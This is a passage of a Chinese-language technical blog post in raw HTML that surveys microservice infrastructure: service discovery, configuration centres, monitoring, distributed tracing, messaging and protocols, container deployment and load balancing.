href=\"https://my.oschina.net/yu120/blog/1788928?nocache=1523859217622\">优雅停机方案</a></p>\n<h4 id=\"扩展元数据\"><a href=\"#扩展元数据\" class=\"headerlink\" title=\"扩展元数据\"></a>扩展元数据</h4><p>简单地将 IP 和 port 信息注册上去，可以满足基本的服务调用的需求，但是在业务发展到一定程度的时候，我们还会有这些需求：</p>\n<p><code>想知道某个 HTTP 服务是否开启了 TLS.</code></p>\n<p><code>对相同服务下的不同节点设置不同的权重，进行流量调度。</code></p>\n<p><code>将服务分成预发环境和生产环境，方便进行切流。</code></p>\n<p><code>不同机房的服务注册时加上机房的标签，以实现同机房优先的路由规则。</code></p>\n<p>一个良好的服务注册中心在设计最初就应该支持这些扩展字段。</p>\n<h4 id=\"探活机制\"><a href=\"#探活机制\" class=\"headerlink\" title=\"探活机制\"></a>探活机制</h4><p>由于服务自身的注册混合下线并不总是成功，所以注册中心和服务之间还需要有额外的探活机制来检测服务是否在线。通常有两种模式，客户端模式和服务端模式。</p>\n<p>客户端模式是指客户端定时向注册中心发送心跳来表明服务状态正常，心跳可以是TCP形式，也可以是http形式，可以通过短连接形式，也可以通过长连接形式。ZooKeeper维持的session本质上是一种长连接的客户端心跳机制。</p>\n<p>服务端模式是指注册中心主动调用服务发布的某个接口，返回结果成功表示服务状态正常。这个接口可以是HTTP接口，也可以是RPC接口。服务端模式相较客户端模式的好处是除了判断出服务活着之外，还能判断出服务工作正常。但是缺点是每个服务发布的接口不同，无法做到通用。</p>\n<h4 id=\"推拉问题\"><a href=\"#推拉问题\" class=\"headerlink\" title=\"推拉问题\"></a>推拉问题</h4><p>服务的扩缩容通知机制通常都是基于观察者模式，一个服务的节点更新后，会推给订阅该服务的所有服务。是一种推的模式。</p>\n<p>但是推的模式会面临丢失的问题，比如你下线的时间中他更新了，或者网络问题持续推送失败，导致丢失更新。所以注册中心支持拉的机制是很必要的， 服务可以在刚上线时拉取所有关注的服务，并定时向注册中心拉取服务信息。</p>\n<h4 id=\"本地容灾\"><a href=\"#本地容灾\" class=\"headerlink\" title=\"本地容灾\"></a>本地容灾</h4><p>首先，下游服务的信息需要在内存中缓存，防止注册中心发生不可用。</p>\n<p>接着，本地缓存文件也需要缓存下游服务信息，防止注册中心不可用时，服务自己发生了重启，这时内存中的信息就丢失了，本地缓存文件可以提供下游服务信息。</p>\n<p>还有，你需要提供本地容灾文件夹，文件夹中正常时候没有文件，当注册中心长时间不可用，而下游服务又在期间发生了变更时，我们就可以通过在容灾文件夹中添加容灾文件来启动本地容灾，这时服务会忽略本地缓存文件，而从容灾文件中读取配置。此时效果等价于直接修改掉本地缓存文件。</p>\n<h4 id=\"LVS-服务树\"><a href=\"#LVS-服务树\" class=\"headerlink\" title=\"LVS+服务树\"></a>LVS+服务树</h4><p>另一种自动感知服务扩缩容的方式是借助LVS。LVS是一种负载均衡方案，即服务对外提供一个VIP，上游访问VIP就可以自动均匀的访问服务的多台机器，而无需知道每一台服务器的ip。</p>\n<p>微服务架构的公司一般都有服务树，当服务进行扩缩容时，服务树相应的就会发生变更，这时服务树系统可以更新VIP下面所挂的机器列表，而上游服务可以继续无感知的调用VIP。这就相当于服务注册的工作交给服务树系统来完成了，服务获取的工作则交给LVS来完成了。VIP机制的唯一问题是有的时候服务树上的节点迁移或者拆分，相应的VIP就会发生更改，这种情况上游就得手动切换VIP了。</p>\n<p>不知道你有没有考虑过一个问题，就是注册中心本身的扩缩容是如何被感知的。</p>\n<p>通常的做法是注册中心的VIP通过公司全局的一个URL暴露出来，注册中心本身的扩缩容通过VIP屏蔽。</p>\n<p>关于LVS的工作原理可以参考<a href=\"https://yizhi.ren/2019/05/03/lvs/\">LVS的原理-工作模式</a>。</p>\n<h4 id=\"架构举例\"><a href=\"#架构举例\" class=\"headerlink\" title=\"架构举例\"></a>架构举例</h4><p>我们已经可以完全依赖开源组件来搭建服务发现功能了，比如etcd+registrator+confd，这分别是三个独立的组件，其中etcd负责数据存储，registrator负责服务注册，confd负责数据dump。<br>etcd是一个强一致性的存储服务，在CAP机制中追求CP。<br>registrator通过监听docker的unix套接字来获知容器的启动和停止事件，从而获取该变更容器的信息，把其中ip和port等信息注册到etcd中去，一台物理机只需要部署一个registrator。<br>confd会监听etcd中配置的变化，然后根据配置的模板生成配置文件，接着执行指定的命令。</p>\n<p><img src=\"/linkimage/microservices/etcdbasedregistry.png\" alt=\"etcdbasedregistry\"></p>\n<p>图片来自 <a href=\"https://technologyconversations.com/2015/09/08/service-discovery-zookeeper-vs-etcd-vs-consul/\">Service Discovery</a></p>\n<p>注意etcd追求CP，因此etcd本身会存在不可用的短暂时期，这样存在丢失更新的可能，比如registrator检测到修改并注册给etcd，但是etcd不可用，这时候更新就丢失了。registrator应对这种情况的方式是watch+轮询，除了监听容器的启动和停止事件外，还会定时轮询全量的容器，依然可以在轮询中检测到容器变更。</p>\n<p>可以看到服务发现在架构上需要具备3大组件，一个负责存储，一个负责注册，一个负责dump。在各个公司自研的服务发现框架中，经常可见把registrator和confd功能合并到一个组件中，同时可能会在每个container中部署一个sdk或者agent，来支持更加灵活的服务注册和dump加载机制。</p>\n<h3 id=\"服务配置\"><a href=\"#服务配置\" class=\"headerlink\" title=\"服务配置\"></a>服务配置</h3><p>微服务节点数量非常多，通过人工登录每台机器手工修改，效率低，容易出错，特别是在部署和排除故障时，需要快速增删改配置，人工操作显然是不行的。除此之外，有的配置需要运行期动态修改和调整，人工操作是无法做到的。所以微服务需要一个统一的配置中心来管理所有微服务节点的配置。配置中心包括版本管理，节点管理，配置同步等功能。</p>\n<p>注意，我们通常使用的灰度放量，AB实验等流量控制方法，其本质是把流量分组规则下发到某个节点上，这个节点可能是一个router，可能是某个服务，然后在这个节点上的程序读取配置，根据分组规则得出流量属于哪个组，由此来决定后续的流程或者后续的下游。所以我把各种实验的机制也归类到服务配置当中。</p>\n<p>微服务配置中心往往支持下面这些特性中的大部分，但是不一定是全部。</p>\n<h4 id=\"配置实时推送\"><a href=\"#配置实时推送\" class=\"headerlink\" title=\"配置实时推送\"></a>配置实时推送</h4><p>当配置发生变更的时候，配置中心需要将配置实时推送到应用客户端。配置变更有的是通过hook Git Repo的更新，有的是通过在控制台修改配置，或者可能还是别的触发途经。而配置除了有更新时实时推送之外，通常也会支持定时拉取来作为补充。</p>\n<h4 id=\"配置版本管理\"><a href=\"#配置版本管理\" class=\"headerlink\" title=\"配置版本管理\"></a>配置版本管理</h4><p>当配置变更不符合预期的时候，需要根据配置的发布版本进行回滚。配置中心需要具备配置的版本管理和回滚能力，可以在控制台上查看配置的变更情况或进行回滚操作。</p>\n<h4 id=\"配置灰度发布\"><a href=\"#配置灰度发布\" class=\"headerlink\" title=\"配置灰度发布\"></a>配置灰度发布</h4><p>配置的灰度发布是配置中心比较重要的功能，当配置的变更影响比较大的时候，需要先在部分应用实例中验证配置的变更是否符合预期，然后再推送到所有应用实例。</p>\n<h4 id=\"权限管理\"><a href=\"#权限管理\" class=\"headerlink\" title=\"权限管理\"></a>权限管理</h4><p>配置的变更和代码变更都是对应用运行逻辑的改变，重要的配置变更常常会带来很大的影响，对于配置变更的权限管控和审计能力同样是配置中心重要的功能。</p>\n<p>配置中心往往以项目纬度或者配置纬度进行权限管理，配置的owner可以授权其他用户进行配置的修改和发布。</p>\n<h4 id=\"多集群支持\"><a href=\"#多集群支持\" class=\"headerlink\" title=\"多集群支持\"></a>多集群支持</h4><p>当对稳定性要求比较高，不允许各个环境相互影响的时候，需要将多个环境的配置进行物理隔离。也就是说需要支持每个环境有单独的配置中心。这个往往通过部署多套系统来支持。</p>\n<h4 id=\"多环境支持\"><a href=\"#多环境支持\" class=\"headerlink\" title=\"多环境支持\"></a>多环境支持</h4><p>当多个环境不需要严格的物理隔离的时候，我们可以通过配置中心的逻辑隔离方式来做到多环境支持。</p>\n<p>比如可以通过在创建配置的时候就要求指定好配置所在的环境，这样配置只会下发到指定的环境。</p>\n<p>比如通过支持配置的命名空间，不同环境的客户端访问不同命名空间的配置即可。</p>\n<h4 id=\"对语言支持\"><a href=\"#对语言支持\" class=\"headerlink\" title=\"对语言支持\"></a>对语言支持</h4><p>由于微服务可能由不同的语言组成，因此支持多语言也是一个重要的特性。</p>\n<p>一个可行的方案是配置中心提供通用的HTTP API，然后官方支持的语言通过提供的SDK接入，暂时不支持的语言也可以通过低成本进行接入。</p>\n<h3 id=\"服务监控\"><a href=\"#服务监控\" class=\"headerlink\" title=\"服务监控\"></a>服务监控</h3><p>微服务在落地的过程中，监控是其中需要关注的终点之一，微服务的监控面临着众多的难点:</p>\n<p><code>监控对象动态可变，无法预先知晓。</code></p>\n<p><code>监控范围和种类繁杂，各类监控难以互相融合</code>。</p>\n<p><code>软件系统通常会被拆分为数十甚至数百个微服务，这种拆分会使得监控数据爆炸增长</code>。</p>\n<p><code>监控系统本身必须保证可靠，必须支持云上部署，以及快速水平扩容</code>。</p>\n<p>这其中，对象动态可变我们容易理解，数据量暴增我们容易理解，而系统高可用和可扩展可以参见一般的高可用方案，剩下来，我只重点列举一下监控的种类，包含了机器监控，进程监控，metrics监控，中间件监控，和日志监控。</p>\n<h4 id=\"机器监控\"><a href=\"#机器监控\" class=\"headerlink\" title=\"机器监控\"></a>机器监控</h4><p>机器监控主要对微服务实例所运行的基础设施进行监控，包括设施的运行状态，资源使用情况。一般微服务会运行在容器中，因此这个监控通常即包含物理机器又包含了容器的运行状态和资源（CPU，内存，磁盘，网络）使用情况。</p>\n<h4 id=\"进程监控\"><a href=\"#进程监控\" class=\"headerlink\" title=\"进程监控\"></a>进程监控</h4><p>进程监控主要对微服务实例进行监控，包括进程的端口使用状况，以及进程的资源（CPU，内存，磁盘，网络）使用情况。</p>\n<h4 id=\"metrics监控\"><a href=\"#metrics监控\" class=\"headerlink\" title=\"metrics监控\"></a>metrics监控</h4><p>metrics主要对微服务调用指标进行监控，包括接口的请求总数（qps），请求时延（latency），成功率（success ratio）。</p>\n<h4 id=\"中间件监控\"><a href=\"#中间件监控\" class=\"headerlink\" title=\"中间件监控\"></a>中间件监控</h4><p>通常一些中间件，比如Mysql，Redis，MemCached,Kafka等不会算作自己的服务，只是算作一个依赖项，但是他们的状况却对服务本身可用性有重要指向。</p>\n<p>这些中间件的监控项除了qps和latency之外，还包括缓存命中率，消息阻塞个数，消费延迟时间等。</p>\n<h4 id=\"日志监控\"><a href=\"#日志监控\" class=\"headerlink\" title=\"日志监控\"></a>日志监控</h4><p>日志监控通常是监控自定义的业务数据和指标，程序把信息记录到日志中，监控系统通过实时匹配日志来得到监控指标。</p>\n<p>这些指标包括进程core，进程panic，业务降级率，warning数，客户端版本统计等。</p>\n<p>与上面监控配套的是服务报警功能，监控系统要做的是能够配置好报警阈值，报警接收人，报警分级，报警说明等信息。</p>\n<h3 id=\"请求追踪\"><a href=\"#请求追踪\" class=\"headerlink\" title=\"请求追踪\"></a>请求追踪</h3><p>微服务的特点决定了服务的部署是分布式的，大部分功能模块都是单独部署运行的，彼此之间通过复杂交错的通信网络交互，这种架构下，请求会经过很多个微服务的处理和传递，我们难免会遇到这样的问题：</p>\n<p><code>分散在各个服务器上的日志怎么处理？</code></p>\n<p><code>如果业务流出现了错误和异常，如何定位是哪个点出的问题？</code></p>\n<p><code>如何跟踪业务流程的处理顺序和结果？</code></p>\n<h4 id=\"Dapper\"><a href=\"#Dapper\" class=\"headerlink\" title=\"Dapper\"></a>Dapper</h4><p>基于这些问题，Google公司研发了Dapper分布式跟踪系统，发布了相关论文，以此提供了分布式跟踪的实现思路。在这套跟踪系统理论中，有3个核心概念：</p>\n<p><code>traceID: 用来标识每一条业务请求链的唯一ID，需要全局唯一，TraceID需要在整个调用链路上传递。</code></p>\n<p><code>Annotation：业务自定义的埋点信息，可以是手机号、用户ID等关键信息。</code></p>\n<p><code>span：请求链中的每一个环节为一个Span。</code></p>\n<p>每一个span有一个spanID来标识自身这个环节，parentID表示前一个span的ID（你可以认为span信息是一个结构体，包含多个属性），然后依次形成请求链，所以spanID也需要向下游传递。除此之外span中的信息还可以包括请求开始时间，结束时间，RPC调用的调用方信息和被被调用方信息。当我们希望一个spanid可以对应一个RPC请求时，我们需要做到spanid全局唯一，如果没有这个需要，spanid不必全局唯一。下图是串接span的示意图。</p>\n<p><img src=\"/linkimage/microservices/spanids.png\" alt=\"spanids\"></p>\n<p>图片来自<a href=\"https://storage.googleapis.com/pub-tools-public-publication-data/pdf/36356.pdf\">Dapper论文</a></p>\n<p>基于这3个概念，跟踪系统的实现可以分成4个步骤。</p>\n<h4 id=\"日志记录\"><a href=\"#日志记录\" class=\"headerlink\" title=\"日志记录\"></a>日志记录</h4><p>每一个服务在日志中记录下traceid，span信息，和各自需要的annotation信息。</p>\n<p>假如公司层面有一些公共的网络库或者日志库，可以把记录traceid和spanid的工作隐藏起来，做到无侵入，服务方只需要记录自己关注的annotation信息即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自http://jm.taobao.org/2014/03/04/3465/</span><br><span class=\"line\">淘宝鹰眼的实现是:</span><br><span class=\"line\"></span><br><span class=\"line\">在前端请求到达服务器时，应用容器在执行实际业务处理之前，会先执行EagleEye的埋点逻辑，分配全局唯一traceID，并存储在ThreadLocal，同时存储到ThreadLocal还有一个RpcID(等同于spanID)，此时RpcID=0.随后RPC框架每次发起RPC调用都会从ThreadLocal取出RpcId，traceID，并把RpcID+1，与traceID一起通过网络传递到RPC的对端。</span><br><span class=\"line\">对端服务收到RPC请求时，从请求附件取出traeID和RpcID，并存入ThreadLocal，如果还要调用下游则重复前面的步骤。</span><br><span class=\"line\">这里可以看到服务各方完全不需要关注埋点的细节。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"日志收集\"><a href=\"#日志收集\" class=\"headerlink\" title=\"日志收集\"></a>日志收集</h4><p>通过安插在每台服务机器上的agent进行日志收集，比如使用logstash。</p>\n<p>收集来的海量数据需要存储到专门的存储集群中去，比如使用HDFS，HBASE。</p>\n<p><img src=\"/linkimage/microservices/eagleeyestore.png\" alt=\"eagleeyestore\"></p>\n<p>图片来自 <a href=\"https://www.slideshare.net/terryice/eagleeye-with-taobaojavaone\">鹰眼下的淘宝</a></p>\n<h4 id=\"日志分析\"><a href=\"#日志分析\" class=\"headerlink\" title=\"日志分析\"></a>日志分析</h4><p>分析收集来的日志数据，分离线和实时。</p>\n<p><code>离线分析：</code></p>\n<p>根据traceID汇总调用日志；</p>\n<p>根据spanID还原调用关系；</p>\n<p>分析链路状态，比如耗时等；</p>\n<p><code>实时分析：</code></p>\n<p>对单条日志直接分析，不需要汇总，比如建立索引；</p>\n<p>得到链路上的调用情况，比如QPS，latency，error ratio;</p>\n<h4 id=\"日志展示\"><a href=\"#日志展示\" class=\"headerlink\" title=\"日志展示\"></a>日志展示</h4><p>通过分布式跟踪系统的可视化监控页面，展示调用链和各项统计信息，避免去服务器上查看日志的烦恼。</p>\n<p>接下来我们来看图中红色部分，服务部署和服务通信，这两块内容在别的架构中也有存在，只是微服务有他自己的特点。服务部署和服务通信，属于微服务的辅助支撑。</p>\n<h3 id=\"服务通信\"><a href=\"#服务通信\" class=\"headerlink\" title=\"服务通信\"></a>服务通信</h3><p>我们在前面列举微服务特征时就提过，微服务的通信是简单化的，它强调使用轻量的通信机制，包括轻量的消息通道，轻量的消息协议。</p>\n<h4 id=\"消息通道\"><a href=\"#消息通道\" class=\"headerlink\" title=\"消息通道\"></a>消息通道</h4><p>轻量消息通道意味着消息总线只负责消息路由，不处理消息编排，消息转换等额外的工作。有的同学说我们的微服务不需要消息总线，我们都是服务之间直连的，这样是不是更轻量呢？我们要说明，作为消息通道的消息总线并不总是需要的，这很大程度上取决于业务模型，消息总线适合生产者-消费者模型，生产者发布消息，消费者订阅消息并消费消息。</p>\n<p>我们以RabbitMQ为例，RabbitMQ作为一个消息代理来实现分布式系统之间的通信，从而促进微服务的松耦合。</p>\n<p><img src=\"/linkimage/microservices/rabbitmq.png\" alt=\"rabbitmq\"></p>\n<p>图片来自<a href=\"https://m.2cto.com/kf/201612/575219.html\">RabbitMQ下的生产消费者模式与订阅发布模式</a></p>\n<p>生产者和消费者都是通过TCP连接到RabbitMQ的BrokerServer，生产者把消息发布到Exchange，并指明RoutingKey，生产者不关心有哪些Queue和放到哪些Queue，由Broker负责根据RoutingKey把消息路由到相关的Queue，根据规则（完全匹配或者通配符匹配或者广播），一个消息是可以路由到多个Queue的。同一个Queue也可以被多个消费者消费，来分担某一类消息的流量。Queue是事先创建好的，并指定了RoutingKey的，这个RoutingKey跟生产者指明的RoutingKey的意义一样，只是Queue的RoutingKey可以包含通配符用来匹配一类消息。RabbitMQ还为生产者端提供了Confirm机制，为消费者端提供了ACK机制来确保消息成功进入Queue和成功被消费。</p>\n<p>可以看到，RabbitMQ所做的工作就是可靠地把生产者产生的消息路由到消费者手中，没有对消息本身做任何的操作。这是符合微服务架构简单化通信的特征的。</p>\n<h4 id=\"通信协议\"><a href=\"#通信协议\" class=\"headerlink\" title=\"通信协议\"></a>通信协议</h4><p>从不同公司的实践来看，微服务使用的协议多种多样，有基于HTTP的，有直接基于TCP的；有使用thrift的，也有protobuf或者JSON格式的。尽管在《<a href=\"https://martinfowler.com/articles/microservices.html\">microservices</a>》一文中提到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">The two protocols used most commonly are HTTP request-response with resource API&#x27;s and lightweight messaging.</span><br></pre></td></tr></table></figure>\n\n<p>”最常用的两种协议是基于资源API的HTTP请求-响应，和轻量的通信。“</p>\n<p>资源API我们可以理解为面向资源的架构，是符合REST风格的一种架构。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自《RESTFUL WEB SERVICES中文版》：http://www.sendsms.cn/box/dl/_25B1_25E0_25B3_25CC_25BC_25BC_25CA_25F5/_25D4_25AD_25C0_25ED_25CB_25BC_25CF_25EB/_25C9_25E8_25BC_25C6_25BC_25DC_25B9_25B9/RESTful_Web_Service.pdf</span><br><span class=\"line\">第80页</span><br><span class=\"line\"></span><br><span class=\"line\">REST并不是一种架构，而是一组设计原则，你可以讲“在遵守这些原则方面，一个架构做得比另一个架构好”，但是你不能讲&quot;REST架构&quot;，因为不存在一个叫&quot;REST架构&quot;的东西。</span><br><span class=\"line\">...</span><br><span class=\"line\">作为一组设计原则，REST是非常通用的。具体地说，它并不限定于WEB，REST不依赖于HTTP机制或者URI结构。但因为我讨论的是WEB服务，所以特地用WEB相关技术来讲解面向资源的架构(ROA)。我想在特定的编程语言中探讨如何用HTTP和URI来实现REST。加入将来出现非基于WEB的REST式架构，它的最佳实践将根ROA的差不多，只是具体细节会有点差别。</span><br></pre></td></tr></table></figure>\n\n<p>但同时在文章的注释处也说明了，在极端规模下，有些组织会转而使用二进制的协议，但这并不会影响微服务通信简单化的特性。<br>既然协议没有严格限定，那我们来讨论下不同通信协议的选择问题。</p>\n<h5 id=\"调用方式\"><a href=\"#调用方式\" class=\"headerlink\" title=\"调用方式\"></a>调用方式</h5><p>调用方式主要有REST和RPC，我们来对比看看。正如上面来自《RESTFUL WEB SERVICES中文版》的内容所说，REST原则并不限定于WEB，也不依赖于HTTP。但是为了讨论方便，我们以最常见的基于HTTP的WEB服务来作为使用REST设计原则的代表。</p>\n<p>REST是一种架构设计原则，主要有这些特征：</p>\n<p><code>可寻址性</code>，它使用URI定位资源，一个URI只能指示一个资源；</p>\n<p><code>无状态性</code>，请求里包含服务器所需的全部信息，服务器不依赖于任何之前请求提供的信息；</p>\n<p><code>连通性</code>，客户端应用状态自己保存，并在服务器提供的链接的指引下发生变迁；</p>\n<p><code>接口一致性</code>，使用统一的方法来操作资源，对于HTTP而言，统一的操作方法是GET/POST/PUT/DELETE/OPTIONS/HEAD</p>\n<p>可以看到REST使用基于文本的应用层协议，效率低；REST利用通用的协议HTTP来发布服务，因此各种语言都能轻松接入；REST采用统一接口 ，使得每个服务都以同样的方式使用HTTP接口。</p>\n<p>RPC即远程方法调用，应用可以像调用本地方法一样调用远程方法。RPC调用往往跨越传输层和应用层，RPC框架的客户端会基于TCP或者UDP来传递带请求参数的数据到服务端，服务端经过同样的流程返回数据到客户端，使用方可以不关注网络细节。</p>\n<p>使用RPC的服务更在意性能，他们通常选择二进制协议，效率高；同时RPC需要自己制定报文结构，这导致他的通用性受到影响。比如最简单的结构定义如下，试想，每种语言为了接入它，都得实现一遍Parser，不像HTTP已经是一种通用的协议，他的Parser已经被广泛实现。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 一种最简单的私有报文结构</span><br><span class=\"line\"># 前8个字节为magic number，表示协议的开端，接着8个字节为payload的长度，随后跟着长度为length的payload</span><br><span class=\"line\">┌────────────────────────────────────┐</span><br><span class=\"line\">│ magic │ length │  payload          │</span><br><span class=\"line\">└────────────────────────────────────┘</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>相应的，http的报文结构：</p>\n<p><img src=\"/linkimage/microservices/httpstruct.png\" alt=\"httpstruct\"></p>\n<p>图片来自 <a href=\"https://www.cnblogs.com/ImBit/p/5513401.html\">网络协议之Tcp、Http</a></p>\n<p>所以总结如下，应用可以根据需要选择一个合适的服务调用方式：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">比较项</th>\n<th>REST</th>\n<th align=\"left\">RPC</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">传输协议</td>\n<td>HTTP</td>\n<td align=\"left\">TCP/UDP</td>\n</tr>\n<tr>\n<td align=\"center\">性能</td>\n<td>低</td>\n<td align=\"left\">高</td>\n</tr>\n<tr>\n<td align=\"center\">通用性</td>\n<td>高</td>\n<td align=\"left\">低</td>\n</tr>\n</tbody></table>\n<h5 id=\"序列化协议\"><a href=\"#序列化协议\" class=\"headerlink\" title=\"序列化协议\"></a>序列化协议</h5><p>序列化协议用来做什么呢，我们对照前面的私有报文结构来看，序列化协议是关于你如何把你的数据序列化到私有协议的payload（对应http中的body），以及如何把payload反序列化成你要的数据的过程。不管是REST还是RPC，序列化协议都是没有严格定义的，你可以自己选择。关于选择序列化协议的依据，我建议参考下面几个维度。</p>\n<p><code>流行度</code></p>\n<p>流行度高不光意味着他在跨语言跨平台方面更突出，还意味着更低的学习成本，更稳定的功能库，和更小的风险。</p>\n<p><code>性能</code></p>\n<p>性能包括空间开销和时间开销。</p>\n<p>空间开销：序列化需要在原有的数据上加上描述字段，以为反序列化解析之用，过多的描述信息会对网络和磁盘带来巨大压力，特别在海量数据下。</p>\n<p>时间开销：复杂的序列化协议导致过长的编解码时间，过长的时间会导致系统响应缓慢。</p>\n<p><code>可调试性</code></p>\n<p>序列化后的数据正确性在调试中比较困难，难以确定是序列化方还是反序列化方导致的问题。</p>\n<p>所以具有较好可调试性的序列化协议需具备一些特点，</p>\n<p>一种是序列化库需要提供序列化成可读数据的接口，便于查看数据可定位问题（protobuf为例）。</p>\n<p>一种是序列化后的数据本身具有可读性，这方面xml和json就具备人眼可读的特点。</p>\n<p><code>可扩展性</code></p>\n<p>如果能够新增业务字段，而不影响老的服务，这将大大提高系统的灵活性和扩展性。</p>\n<p><code>安全性</code></p>\n<p>这一点主要是指当需要满足加密要求的时候，你如何支持。</p>\n<p>选项一是你的序列化库能集成到https，这样一来加密的要求可以满足。</p>\n<p>选项二是你有自身的ssl方案。比如thrift自身实现ssl传输层方案</p>\n<p>我们可以想到并没有一个协议是样样都占优的，比如二进制协议的性能往往好于字符形式的，但是二进制协议的可调式性却往往差于字符形式的。</p>\n<p>我们只需要根据自己的业务场景和特点，选择最适合你的序列化协议。</p>\n<h3 id=\"服务部署\"><a href=\"#服务部署\" class=\"headerlink\" title=\"服务部署\"></a>服务部署</h3><h4 id=\"服务发布和治理\"><a href=\"#服务发布和治理\" class=\"headerlink\" title=\"服务发布和治理\"></a>服务发布和治理</h4><p>在前面讲微服务特征的时候讲到了微服务的交付自动化:</p>\n<p><img src=\"/linkimage/microservices/pipiline.png\" alt=\"pipeline\"></p>\n<p>我们可以知道自动化交付是微服务架构必不可少的条件。那除了自动化交付外，还有哪些部署相关的措施是微服务必须的呢？</p>\n<p>容器已经被社区接受为交付微服务的一种理想手段，一个轻量级的基于容器的服务部署平台主要包括容器调度系统，发布系统，镜像治理中心，资源治理平台等模块。</p>\n<p><code>容器调度</code></p>\n<p>屏蔽容器细节，将整个集群抽象成容器资源池，支持按需申请和释放容器资源，物理机发生故障时能够实现自动故障迁移 (fail over)。比如kubernetes, mesos, swarm. 这三个项目都能够实现对容器的编排调度，历史上也存在过这三个项目的竞争：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自《阿里巴巴云原生实践15讲》https://developer.aliyun.com/special/mvp/cloudnative</span><br><span class=\"line\">容器编排之争：</span><br><span class=\"line\">相比于 Docker 体系以“单一容器”为核心的应用定义方式，Kubernetes 项目则提出了一整套容器化设计模式和对应的控制模型， 从而明确了如何真正以容器为核心构建能够真正跟开发者对接起来的应用交付和开发范式.</span><br><span class=\"line\">而 Docker公司(的swarm)、 Mesosphere公司(的mesos)以及 Google公司(的Kubernetes)在“应用”这一层上的不同理解和顶层设计，其实就是所谓“编排之争”的核心所在。</span><br><span class=\"line\">2017 年末，Google在过去十年编织全世界最先进的容器化基础设施的经验，最终帮助Kubernetes项目取得到了关键的领导地位，并将CNCF(Cloud Native Computing Foundation)这个以“云原生” 为关键词的组织和生态推向了巅峰。</span><br></pre></td></tr></table></figure>\n\n<p>说到容器调度说到kubernetes，就必须讲到云原生应用。</p>\n<p>我们知道kubernetes调度的是容器，容器包含的是应用，这里面的应用就是云原生应用。</p>\n<p>云原生的意思，一句话解释是应用生而为云。是指应用专门就是为了在云平台部署运行而设计开发的。但是其实大多数传统的应用，不做任何改动，都是可以在云平台运行起来的，只要云平台支持这个传统应用运行所需的计算机架构和操作系统。只不过这种运行模式，仅仅是把虚拟机当物理机一样使用，不能够真正利用起来云平台的能力，所以传统应用不算是云原生应用。云计算平台的核心能力就是提供按需分配资源的能力，而云原生应用的设计理念就是让部署到云平台的应用能够利用云平台的能力实现按需使用资源实现弹性伸缩。</p>\n<p>微服务架构是实现云原生应用的一种架构模式，只要微服务按照一定的设计理念（比如<a href=\"http://blog.didispace.com/12factor-zh-cn/\">云原生的12要素</a>）去设计，就能实验微服务架构下的系统具有按需使用资源的能力。</p>\n<p><code>镜像治理</code></p>\n<p>基于 Docker Registry，封装一些轻量级的治理功能。VMware 开源的 <a href=\"https://github.com/goharbor/harbor\">harbor</a>是目前社区比较成熟的企业级产品，在 Docker Registry 基础上扩展了权限控制，审计，镜像同步，管理界面等治理能力。</p>\n<p><code>资源治理</code></p>\n<p>在容器云环境中，企业需要对应用，人员 ，容器配额和数量等相关信息进行治理。治理的核心是分配好应用、人员和资源之间的权限关系。对于容器管理平台来说，主要关注的资源有计算资源、存储资源和网络资源.</p>\n<p><code>发布平台</code></p>\n<p>面向用户的发布管理控制台，支持发布流程编排。它和其它子系统对接交互，实现基本的应用发布能力。发布平台要对接自动化交付系统和容器调度系统。</p>\n<p>这几个模块之间的关系如下图所示</p>\n<p><img src=\"/linkimage/microservices/deployflow.png\" alt=\"delpoyflow\"></p>\n<p>用户的操作流程如下：</p>\n<p>应用通过自动化交付系统集成后生成镜像，开发人员将镜像推到镜像治理中心；</p>\n<p>用户在资源治理平台申请发布应用，填写发布配额发布策略等相关信息，然后等待审批通过；</p>\n<p>发布申请审批通过，开发人员通过发布平台发布应用；</p>\n<p>发布平台通过查询资源治理平台获取发布规格信息；</p>\n<p>发布平台向容器云发出启动容器实例指令；</p>\n<p>容器云从镜像治理中心拉取镜像并启动容器；</p>\n<h4 id=\"负载均衡和高可用\"><a href=\"#负载均衡和高可用\" class=\"headerlink\" title=\"负载均衡和高可用\"></a>负载均衡和高可用</h4><p>微服务架构中的服务数量众多，每个服务都希望自己的服务节点可以动态扩展，流量可以负载均衡，服务自身可以高可用。因此我们希望用一种通用的方案来实现，并把它放到部署系统中。</p>\n<h5 id=\"负载均衡\"><a href=\"#负载均衡\" class=\"headerlink\" title=\"负载均衡\"></a>负载均衡</h5><p>负载均衡通常有两种方式，一种服务端方式，一种客户端方式。</p>\n<p><code>服务端</code></p>\n<p>服务端方式是指服务提供方自己提供一个负载均衡器，客户端统一访问这个负载均衡器，由负载均衡器自己来进行负载分配。</p>\n<p>能提供服务端方式的负载均衡的产品有两大类，一类是基于NAT原理，通过篡改数据包来进行请求的路由。相关的产品硬件上有F5，软件上有LVS，这F5和LVS的的实现原理是类似的，通过修改底层数据的源IP和目标IP来实现数据路由，区别是F5的核心是用硬件芯片来完成的，在性能上要强于LVS。对LVS工作原理感兴趣的可以参考<a 